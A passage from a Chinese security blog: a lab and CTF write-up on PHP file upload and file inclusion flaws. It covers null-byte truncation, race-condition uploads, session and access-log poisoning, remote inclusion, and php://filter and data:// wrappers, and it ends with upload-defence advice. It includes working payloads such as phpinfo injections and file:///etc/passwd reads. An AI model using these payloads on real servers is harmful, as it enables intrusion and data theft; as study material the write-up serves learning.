class="line">#### 解决方法：</span><br><span class="line"></span><br><span class="line">​									这一题我认为最重要的是理解%00在php中是作为字符串的结束符</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;D:\blog\H01iday\source\_posts\pics\upload35.png&quot; alt=&quot;upload35&quot; style=&quot;zoom:67%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">​									这里前缀是作为path被上传；上传的文件作为upfile被上传</span><br><span class="line"></span><br><span class="line">​									当path作为变量传入`$path=‘up/’.\$_POST[path].&#x27;\_&#x27;.rand().&#x27;.jpg&#x27;`中 如果path中含有%00结束符，则会自动把`$_POST[path]`后面的内容都忽略</span><br><span class="line"></span><br><span class="line">​									举个栗子：</span><br><span class="line"></span><br><span class="line">​											上面前缀名path为hacker.php    upfile为CMU.jpg  上传之后用burp拦截</span><br><span class="line"></span><br><span class="line">​											![upload36](D:\blog\H01iday\source\_posts\pics\upload36.png)</span><br><span class="line"></span><br><span class="line">​											现在目的是在path后面加上截断符号%00</span><br><span class="line"></span><br><span class="line">​											如果直接加：百分号%会被urlencode成%25</span><br><span class="line"></span><br><span class="line">​										【urlencode()函数原理就是首先把中文字符转换为*十六进制*,然后在每个字符前面加一个标识符%】</span><br><span class="line"></span><br><span class="line">​                                          	![upload36](D:\blog\H01iday\source\_posts\pics\upload37.png)</span><br><span class="line"></span><br><span class="line">​											改变方法：先在path后面加一个空格【urlencode结果：%20】再将20改为00</span><br><span class="line"></span><br><span class="line">​											![upload39](D:\blog\H01iday\source\_posts\pics\upload39.png)</span><br><span class="line"></span><br><span class="line">​											这样就插入了结束符%00【注意，这里不一定要是空格，随便什么都行，只要你在path后面的hex值改为00就行】</span><br><span class="line"></span><br><span class="line">​											用AntSword发现成功上传了！hacker.php!</span><br><span class="line"></span><br><span class="line">​													&lt;img src=&quot;D:\blog\H01iday\source\_posts\pics\upload40.png&quot; alt=&quot;upload39&quot; style=&quot;zoom:80%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 另外的思考：</span><br><span class="line"></span><br><span class="line">​		在cuthub上面，做了一道文件截断的题目。具体内容如下：</span><br><span class="line"></span><br><span class="line">​			设置了白名单![upload45](D:\blog\H01iday\source\_posts\pics\upload45.png)</span><br><span class="line"></span><br><span class="line">​		解决方法是这样的</span><br><span class="line"></span><br><span class="line">![upload46](D:\blog\H01iday\source\_posts\pics\upload46.png)</span><br><span class="line"></span><br><span class="line">直接上传成功</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;D:\blog\H01iday\source\_posts\pics\upload47.png&quot; alt=&quot;upload47&quot; style=&quot;zoom:67%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我的困惑是在于，为什么iwebsec上的题目我就需要将文件名后面的空格手动修改为00，%00不起作用；而在ctfhub上面这道题我就可以直接用%00而不用修改hex值呢？</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">经过查阅，我发现在iwebsec上提交方法是post，由于有文件即type=file的input，所以enctype = multipart/form-data [这种方式下form的内容一律不进行编码]，所以需要我手动修改成编码后的结果</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;D:\blog\H01iday\source\_posts\pics\upload35.png&quot; alt=&quot;upload35&quot; style=&quot;zoom:67%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">而在ctfhub上面的题，虽说文件还是通过post传送，但是真正修改的文件名其实是发生在url中【注意：form的action中地址可以是绝对地址或相对地址，这里的就是相对地址】在url中，是会自动编码的，所以不需要我手动添加hex为00的值，在url中%00会自动编码为结束符。</span><br><span class="line"></span><br><span class="line">![upload46](D:\blog\H01iday\source\_posts\pics\upload46.png)</span><br><span class="line"></span><br><span class="line">### 07条件竞争文件上传</span><br><span class="line"></span><br><span class="line">#### **基础知识:**</span><br><span class="line"></span><br><span class="line">什么是条件竞争上传？</span><br><span class="line"></span><br><span class="line">服务器允许用户提交任何类型的文件，再检测文件是否安全或是否符合要求。</span><br><span class="line"></span><br><span class="line">如果文件不满足要求就将文件删除。</span><br><span class="line"></span><br><span class="line">在文件成功存储和将文件删除之间有一段空隙时间。</span><br><span class="line"></span><br><span class="line">可以：上传恶意php文件，并在被删除之间访问该php文件。那么里面的恶意代码如phpinfo()就能被执行</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;D:\blog\H01iday\source\_posts\pics\upload14.png&quot; alt=&quot;upload14&quot; style=&quot;zoom: 80%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">**用到的PHP函数**</span><br><span class="line"></span><br><span class="line">- ​		**PHP explode(分隔符，字符串，[最多进行多少次分割limit]) ：**</span><br><span class="line"></span><br><span class="line">​		例：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">$str = &#x27;one,two,three,four&#x27;;</span><br><span class="line">print_r(explode(&#x27;,&#x27;,$str,0));//Array ( [0] =&gt; one,two,three,four ) </span><br><span class="line">print_r(explode(&#x27;,&#x27;,$str,2));//Array ( [0] =&gt; one [1] =&gt; two,three,four )</span><br><span class="line">print_r(explode(&#x27;,&#x27;,$str,-1));//Array ( [0] =&gt; one [1] =&gt; two [2] =&gt; three ) 除了最后limit个其它所有元素</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>​    <strong>array_pop()删除数组中的最后一个元素</strong></p>
</li>
<li><p>​    <strong>in_array(search, array,[type])搜索数组中是否存在指定的值</strong></p>
</li>
</ul>
<p>​    search:在数组中搜索的值</p>
<p>​    array:要搜索的数组</p>
<p>​    type:如果为true，还需要判断search的类型和数组元素的类型是否一致</p>
<ul>
<li><p>​    <strong>fputs(file, string, [length])</strong></p>
<p>​    file：要打开的文件</p>
<p>​    string：要写入文件的字符串</p>
<p>​    length：规定要写入的最大字节数。</p>
</li>
<li><p>   <strong>fopen(filename, mode)</strong></p>
</li>
</ul>
<table>
<thead>
<tr>
<th>mode</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>只读</td>
</tr>
<tr>
<td>r+</td>
<td>读写</td>
</tr>
<tr>
<td>w</td>
<td>清除原内容 写  文件不存在则新建 指针指向文件头</td>
</tr>
<tr>
<td>w+</td>
<td>清除原内容 读写  文件不存在则新建 指针指向文件头</td>
</tr>
<tr>
<td>a</td>
<td>写 文件不存在则新建 指针指向文件尾</td>
</tr>
<tr>
<td>a+</td>
<td>读写文件不存在则新建 指针指向文件尾</td>
</tr>
</tbody></table>
<ul>
<li><p><strong>@</strong></p>
<p>@在php中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。</p>
</li>
</ul>
<h4 id="目标：-5"><a href="#目标：-5" class="headerlink" title="目标："></a><strong>目标：</strong></h4><p>上传php文件并且读取phpinfo()信息</p>
<h4 id="解决方法：-4"><a href="#解决方法：-4" class="headerlink" title="解决方法："></a><strong>解决方法</strong>：</h4><p>​    首先 上传2.php文件</p>
<p>​    如图为2.php文件的内容</p>
<p>​    在同目录下新建shell.php</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload16.png" alt="upload16" style="zoom:80%;" />

<p>​    </p>
<p>​    用burp suite拦截  intruder</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload15.png" alt="upload16" style="zoom:80%;" />

<p>​    访问2.php文件，用burp suite拦截  intruder</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload17.png" alt="upload16" style="zoom:80%;" />

<img src="D:\blog\H01iday\source\_posts\pics\upload18.png" alt="upload18" style="zoom:80%;" />

<p><img src="D:\blog\H01iday\source_posts\pics\upload19.png" alt="upload19"></p>
<p>这里我存在的问题是：我本来一直在访问2.php文件，认为只有刷出2.php页面才能代表里面的代码被运行，shell.php才被创建，但是总是not found</p>
<p>但是因为后台运行很快，其实基本没法看到2.php页面</p>
<p><strong>更重要的是！其实status200出现就代表，2.php文件被访问过了，是bp访问过的</strong></p>
<p>所以里面的代码肯定被自动执行过了</p>
<p>所以直接访问shell.php即可，不用管2.php</p>
<p><img src="D:\blog\H01iday\source_posts\pics\upload20.png" alt="upload20"></p>
<img src="D:\blog\H01iday\source\_posts\pics\upload21.png" alt="upload20" style="zoom:80%;" />



<p>成功看到phpinfo()!</p>
<img src="D:\blog\H01iday\source\_posts\pics\upload22.png" alt="upload22" style="zoom:67%;" />





<h3 id="08双写后缀"><a href="#08双写后缀" class="headerlink" title="08双写后缀"></a>08双写后缀</h3><p>​    【本题出自CTFhub】</p>
<h4 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h4><p>​        本题将所有的php都换成空字符串””</p>
<p>​        <img src="D:\blog\H01iday\source\_posts\pics\upload43.png" alt="upload43" style="zoom:80%;" /></p>
<h4 id="目标：-6"><a href="#目标：-6" class="headerlink" title="目标："></a>目标：</h4><p>​            上传一个php文件</p>
<h4 id="解决方法：-5"><a href="#解决方法：-5" class="headerlink" title="解决方法："></a>解决方法：</h4><p>​        双写后缀如下，当检测到中间的php并换成空串之后，形成了hack.php即正确的文件名</p>
<p>​        <img src="D:\blog\H01iday\source_posts\pics\upload44.png" alt="upload44"></p>
<h2 id="文件上传漏洞的防御"><a href="#文件上传漏洞的防御" class="headerlink" title="文件上传漏洞的防御"></a>文件上传漏洞的防御</h2><h4 id="①文件上传的目录设置为不可执行"><a href="#①文件上传的目录设置为不可执行" class="headerlink" title="①文件上传的目录设置为不可执行"></a>①文件上传的目录设置为不可执行</h4><p>​        只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会收到影响，因此这一点至关重要。</p>
<h4 id="②判断文件类型"><a href="#②判断文件类型" class="headerlink" title="②判断文件类型"></a>②判断文件类型</h4><p>​        在判断文件类型时，可以结合使用MIME Type、后缀检查等方式</p>
<p>​        使用白名单方式【黑名单不可靠】</p>
<p>​        对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
<h4 id="③使用随机数改写成文件名和文件路径"><a href="#③使用随机数改写成文件名和文件路径" class="headerlink" title="③使用随机数改写成文件名和文件路径"></a>③使用随机数改写成文件名和文件路径</h4><p>​    php文件需要用户访问到才能执行。如果用户访问不到，即使文件上传上去了，里面的恶意代码也不会被执行。</p>
<p>​    应用随机数改写了文件名和路径，将极大的增加攻击成本</p>
<h4 id="④单独设置文件服务器的域名"><a href="#④单独设置文件服务器的域名" class="headerlink" title="④单独设置文件服务器的域名"></a>④单独设置文件服务器的域名</h4><p>​        由于浏览器同源策略的关系，一系列客户端攻击将无效</p>
<h4 id="⑤使用安全设备防御"><a href="#⑤使用安全设备防御" class="headerlink" title="⑤使用安全设备防御"></a>⑤使用安全设备防御</h4><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h3 id="01本地文件包含"><a href="#01本地文件包含" class="headerlink" title="01本地文件包含"></a>01本地文件包含</h3><h4 id="问题描述：-4"><a href="#问题描述：-4" class="headerlink" title="问题描述："></a>问题描述：</h4><p>​    <img src="file:///C:\Users\86176\AppData\Roaming\Tencent\Users\1970869031\QQ\WinTemp\RichOle\FMCQ_T`B@H@5734R_}%5KGV.png" alt="img"></p>
<h4 id="目标：-7"><a href="#目标：-7" class="headerlink" title="目标："></a>目标：</h4><p>​    读取服务器中任意一个文件</p>
<h4 id="解决方法：-6"><a href="#解决方法：-6" class="headerlink" title="解决方法："></a>解决方法：</h4><p>​    因为这里对文件没有任何限制，直接</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file2.png" alt="file3"></p>
<p>可以直接读到敏感文件信息</p>
<img src="D:\blog\H01iday\source\_posts\pics\file3.png" alt="file3" style="zoom: 50%;" />



<h3 id="02本地文件包含绕过"><a href="#02本地文件包含绕过" class="headerlink" title="02本地文件包含绕过"></a>02本地文件包含绕过</h3><h4 id="问题描述：-5"><a href="#问题描述：-5" class="headerlink" title="问题描述："></a>问题描述：</h4><p>这里只要求用户输入文件名不带后缀，在php自动给加上html后缀</p>
<p>​                   <img src="D:\blog\H01iday\source_posts\pics\file4.png" alt="file4"></p>
<h4 id="目标：-8"><a href="#目标：-8" class="headerlink" title="目标："></a>目标：</h4><p>​    访问test.txt文件文件内容【&lt;?php phpinfo();?&gt;】</p>
<h4 id="解决方法：-7"><a href="#解决方法：-7" class="headerlink" title="解决方法："></a>解决方法：</h4><p>​    ①这也简单，直接用%00截断后面即可；因为是在url，会自动编码，不需要burp拦截手动编【问号?在url中也可以当作是截断符，?后面的代码会被解释成URL的querystring】</p>
<p> 或者 ②利用操作系统统存在最长目录的限制，可以通过输入超过最长 目录的路径长度，这样系统就会将后面的路径丢弃，导致后缀截断。</p>
<p>windows下目录最大长度为256字节，超出的部分会被丢弃。</p>
<p> linux下目录最大长度为4096字节，超出的部分会被丢 弃。</p>
<p>Windows系统下后面跟点.不影响路径访问</p>
<p> Linux系统下添加/.不影响路径访问</p>
<p>有①就不没必要用②了</p>
<p>成功绕过！</p>
<img src="D:\blog\H01iday\source\_posts\pics\file5.png" alt="file5" style="zoom:80%;" />



<h3 id="03session本地文件包含"><a href="#03session本地文件包含" class="headerlink" title="03session本地文件包含"></a>03session本地文件包含</h3><h4 id="基础知识：-4"><a href="#基础知识：-4" class="headerlink" title="基础知识："></a>基础知识：</h4><ol>
<li><p>session是什么？</p>
<p>​    session就是服务器给客户端的一个编号。当用户首次和服务器建立连接，它就与该服务器建立了一个session，同时服务器会为其分配一个sessionID。</p>
<p>​    sessionID就是用来表示用户身份。每个用户有一个唯一的sessionID。</p>
<p>​    session文件一般文件名为：sess_randomStuff(后面跟32位随机字符串,这一串字符串就是sessionID)</p>
<p>​    session文件的内容为：变量名|类型|长度|变量值</p>
<p>​    php创建session：①启动session会话session_start()②声明admin变量并赋空值$_session[“admin”] = null;【首次验证通过设置$admin = true,以后可以通过直接判断$admin是否为true来判断用户的登陆状态】</p>
</li>
<li><p>linux系统下 session文件的存放路径：/tmp 或 /var/lib/php/session</p>
</li>
<li><p>php://filter</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>resource</td>
<td>必须。要进行过滤的数据流</td>
</tr>
<tr>
<td>read</td>
<td>可选。设定一/多个过滤器名称，以’|’分隔</td>
</tr>
<tr>
<td>write</td>
<td>可选。同上</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/read=convert.base64-encode/resource=06.php</span><br></pre></td></tr></table></figure>

<p>上例是对06.php的文件内容先进行base64的encode 再进行读入</p>
</li>
<li><p>base64 encode/decode基本原理</p>
<p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p>
<p>encode原理：下面对“Man”进行base64编码</p>
<p>①三个字母的ASCII对应写出，并用8位二进制数表示，如果不足8位高位补0</p>
<p>②6bits一组，分成4组</p>
<p>③每组高位补00，写出对应的值，得到4个值</p>
<p>④在Base64编码表查找，找到对应的字符</p>
<p>则Man 的 base64编码之后的值即为 TWFu</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file18.jpg" alt="hawt1"></p>
<p>简而言之：  先写出8位的2进制表示  得到24bit——&gt;再24分为4组 每组6位 ——&gt;四组 每组对应一个字符</p>
<p>​                    所以编码后的值的长度总是编码前的4/3</p>
<p>decode原理：即先写出4个字符对应的二进制 共24位——&gt;再分成三组  每组有一个对应的字符;decode的时候如果有特殊字符，即不在（A-Z、a-z、0-9、+、/）范围内的字符，会直接跳过，仅将合法字符组成一个新的字符串进行解码。</p>
<p>综上：加密是3个字符[字节]一组进行加密</p>
<p>如果不满三个字节则补0</p>
<p>例：只有2个字节，16个bits，分为6个一组时第三组差2个，用0补齐；第四组没有数据，全部为0，代表’=’</p>
<p>​        只有1个字节，8bits,分为6个一组时第2组差4个，用0补齐；第三组第四组没有数据，全部为0，代表’=’</p>
</li>
<li></li>
</ol>
<h4 id="问题描述：-6"><a href="#问题描述：-6" class="headerlink" title="问题描述："></a>问题描述：</h4><p>​    说明以下代码：变量iwebsec的内容将作为session文件中变量username的值。并且存储到session文件中。</p>
<p>​    所以我只要将恶意代码作为iwebsec的值，就可以在sess_…文件中嵌入恶意代码。</p>
<p>​    再在有文件包含漏洞，调用了include、request等函数的文件中，include以下这个sess_…文件，那么我的php恶意代码就会被执行</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file6.png" alt="file6"></p>
<h4 id="目标：-9"><a href="#目标：-9" class="headerlink" title="目标："></a>目标：</h4><p>​    显示phpifo()</p>
<h4 id="解决方法：-8"><a href="#解决方法：-8" class="headerlink" title="解决方法："></a>解决方法：</h4><pre><code>                 在sess_...文件中嵌入恶意代码\&lt;?php phpinfo()?&gt;
</code></pre>
<p>​                                                          <img src="D:\blog\H01iday\source\_posts\pics\file8.png" alt="file8" style="zoom:80%;" />                        </p>
<p>​                    在F12查看PHPSESSID 对应的value即为sessionID的值</p>
<img src="D:\blog\H01iday\source\_posts\pics\file9.png" alt="file9" style="zoom:67%;" />

<p>​                        在01.php 即含有本地文件包含漏洞  filename= 【刚刚存储的session文件路径】</p>
<p>​                        自动执行里面的php代码，显示phpinfo</p>
<img src="D:\blog\H01iday\source\_posts\pics\file10.png" alt="file9" style="zoom: 50%;" />



<h4 id="复杂一点的情况："><a href="#复杂一点的情况：" class="headerlink" title="复杂一点的情况："></a>复杂一点的情况：</h4><p><strong>demo</strong></p>
<p><strong>session.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = base64_encode(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username -&gt; <span class="subst">$username</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这种情况下，username的值就会先进行base64 encode之后再存储到session文件中</p>
<p>就算被index.php文件包含，也不会执行恶意代码。因为里面的不再是php代码，而是被encode的内容</p>
<p>那么应该怎么办呢？</p>
<p>利用php://filter</p>
<p>首先按照老样子，给username赋值【恶意php代码】</p>
<img src="D:\blog\H01iday\source\_posts\pics\file11.png" alt="file11" style="zoom:80%;" />

<p>​    查看session_id值 访问index.php文件并使file为sess_..文件</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file12.png" alt="file11"></p>
<p>​        发现出现的内容是这样的？</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file13.png" alt="file11"></p>
<p>​    噢原来问题出在这：我们加密的时候是只对username的值部分进行加密，下面图片中的全部内容是sess_…文件中的全部内容</p>
<p>​    但是解密的时候是将下面所有的东西都进行解密</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file14.png" alt="file11"></p>
<p>​    base64加密解密不是一个字符一个字符对应加密解密的。所以要解决这个问题，得了解base64 encode/decode的原理，见基础知识4</p>
<p>​    可以知道，为了解密时不会影响后面的内容，前面username|s:24:”，去掉特殊字符之后，必须满足时4的整数，现在时usernames24是11位，要12位才满足是4的整数。怎么办呢？username变量名不能变，s类型不能变，24可以变！变成3位即可！ 所以我将username的值不断加长，使其加密后的内容长度为3位数</p>
<img src="D:\blog\H01iday\source\_posts\pics\file19.png" alt="file19" style="zoom:67%;" />

<p><img src="D:\blog\H01iday\source_posts\pics\file15.png" alt="file11"></p>
<p><img src="D:\blog\H01iday\source_posts\pics\file16.png" alt="file11"></p>
<p>最后解密成功！成功执行&lt;?php phpinfo();?&gt;</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file17.png" alt="file11"></p>
<h3 id="04日志文件包含"><a href="#04日志文件包含" class="headerlink" title="04日志文件包含"></a>04日志文件包含</h3><h4 id="基础知识：-5"><a href="#基础知识：-5" class="headerlink" title="基础知识："></a>基础知识：</h4><ol>
<li><p>access_log的文件格式</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file20.png" alt="file20"></p>
<p>从上面的access_log中的一条记录可以看出，内容包含了请求的url</p>
<p>即上面的“http://……%3E”</p>
</li>
<li><p>Apache默认日志的路径：</p>
<p>/var/log/httpd/access_log或者/etc/httpd/logs/access_log</p>
</li>
</ol>
<h4 id="问题描述：-7"><a href="#问题描述：-7" class="headerlink" title="问题描述："></a>问题描述：</h4><p>​    利用访问的url内容会被记录到access_log这一特性，对access_log进行文件包含</p>
<p>​    如果在url中含有恶意代码，那么恶意代码会被自动保存在access_log中，被包含时恶意代码会自动执行</p>
<h4 id="目标：-10"><a href="#目标：-10" class="headerlink" title="目标："></a>目标：</h4><p>​    显示phpinfo文件</p>
<h4 id="解决方法：-9"><a href="#解决方法：-9" class="headerlink" title="解决方法："></a>解决方法：</h4><p>这样进行访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.201.131/fi/01.php?filename=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>在虚拟机上访问access_log文件，发现记录的内容是这样的</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file21.png" alt="file21"></p>
<p>原来是因为在url中特殊字符会被自动编码</p>
<p>所以需要在bp拦截，并且修改，得到下面正常的结果</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file22.png" alt="file22"></p>
<p>再在具有文件包含漏洞的地方包含access_log文件 成功获取phpinfo信息</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file23.png" alt="file22"></p>
<h3 id="05无限制远程文件包含"><a href="#05无限制远程文件包含" class="headerlink" title="05无限制远程文件包含"></a>05无限制远程文件包含</h3><h4 id="基础知识：-6"><a href="#基础知识：-6" class="headerlink" title="基础知识："></a>基础知识：</h4><pre><code> 1. 远程文件包含是指包含的文件的位置并不是在本地服务器，而是可以通过URL的形式，包含其他服务器上的文件。
 2. 漏洞利用条件：`allow_url_fopen = on` 和 `allow_url_include`
 3. allow_url_fopen：on允许file、fopen、file_get_contents打开远程url文件 默认开启
 4. 允许include、request包含远程url文件  默认关闭
</code></pre>
<h4 id="问题描述：-8"><a href="#问题描述：-8" class="headerlink" title="问题描述："></a>问题描述：</h4><p><img src="D:\blog\H01iday\source_posts\pics\file24.png" alt="file24"></p>
<h4 id="目标：-11"><a href="#目标：-11" class="headerlink" title="目标："></a>目标：</h4><p>​    在虚拟机上包含我的本地机上的文件，输出phpinfo信息</p>
<h4 id="解决方法：-10"><a href="#解决方法：-10" class="headerlink" title="解决方法："></a>解决方法：</h4><p>​    现在我的本地机的服务器上放一个phpinfo.txt文件，里面存放恶意代码</p>
<p>​    <img src="D:\blog\H01iday\source\_posts\pics\file25.png" alt="file25" style="zoom:80%;" /></p>
<p>​    cmd ipconfig 查看我的公网ip</p>
<img src="D:\blog\H01iday\source\_posts\pics\file26.png" alt="file26" style="zoom:67%;" />

<p>远程文件包含，包含我本机的准备好的文件，如图成功执行并获得phpinfo信息</p>
<img src="D:\blog\H01iday\source\_posts\pics\file27.png" alt="file27" style="zoom:67%;" />



<h3 id="06php伪协议"><a href="#06php伪协议" class="headerlink" title="06php伪协议"></a>06php伪协议</h3><p>关于伪协议涉及到的内容  php.ini文件</p>
<p>allow_url_fopen 默认开启</p>
<p>allow_url_include 默认关闭</p>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>php://filter</p>
<p>读取需要开启allow_url_fopen，不需要开启allow_url_include</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>resource</td>
<td>必须。要进行过滤的数据流</td>
</tr>
<tr>
<td>read</td>
<td>可选。设定一/多个过滤器名称，以’|’分隔</td>
</tr>
<tr>
<td>write</td>
<td>可选。同上</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/read=convert.base64-encode/resource=06.php</span><br></pre></td></tr></table></figure>

<p>举个栗子：</p>
<p>对<code>Hello World</code>进行base64的编码</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file28.png" alt="file28"></p>
<p>存入虚拟机中06.php的统一文件夹下</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file29.png" alt="file29"></p>
<p>如下进行文件包含，使用了filter 并且进行base-64 decode</p>
<p><img src="D:\blog\H01iday\source_posts\pics\file30.png" alt="file29"></p>
<p>显示解码后的正确内容</p>
<img src="D:\blog\H01iday\source\_posts\pics\file31.png" alt="file29" style="zoom:67%;" />

<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><h4 id="data-text-plain协议"><a href="#data-text-plain协议" class="headerlink" title="data://text/plain协议"></a>data://text/plain协议</h4><p>如果data传入的数据为PHP代码，就会以PHP代码形式解析数据</p>
<p>要求：双on</p>
<p>格式：</p>
<ol>
<li><p>【进行base64编码】data://text/plain;base64,base64编码字符</p>
<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgcGhwaW5mbygpOz8%2B</span><br><span class="line">来源：</span><br><span class="line">&lt;?php phpinfo();?&gt;===base64编码===》PD9waHAgcGhwaW5mbygpOz8+===urlencode===》PD9waHAgcGhwaW5mbygpOz8%2B</span><br><span class="line">因为经过了base64编码之后有+特殊字符 所以需要再进行url编码</span><br><span class="line"></span><br><span class="line">还有一种：PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">来源：</span><br><span class="line">&lt;?php phpinfo()?&gt;===base编码===》PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">注意，和上面的区别在于上面没有;符号</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">①写了;可以不写后面的?&gt;  因为;就可以说明结束</span><br><span class="line">②没写;就必须写?&gt;作为结束</span><br><span class="line">③可以通过添加空格改变base64的编码使得+加号消失，例如在&lt;?php后面多加空格，语法也没错误，但是base64 encode结果没有了加号</span><br></pre></td></tr></table></figure></li>
<li><p>【无编码】data://text/plain,字符</p>
<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.201.131/fi/10.php?filename=data://text/plain,&lt;?php phpinfo();?&gt;【如果这种不行可能是因为浏览器没有对url自动编码，就直接对字符内容进行url编码】</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h4><p>议可以访问本地文件系统，读取到文件的内容。</p>
<p>allow_url_open及allow_url_include都无需打开</p>
<p>filename=file:///etc/passwd和filename=/etc/passwd效果一样</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/17/php-note/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/17/php-note/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-17 20:28:12" itemprop="dateCreated datePublished" datetime="2021-09-17T20:28:12+08:00">2021-09-17</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-09 15:39:22" itemprop="dateModified" datetime="2021-10-09T15:39:22+08:00">2021-10-09</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
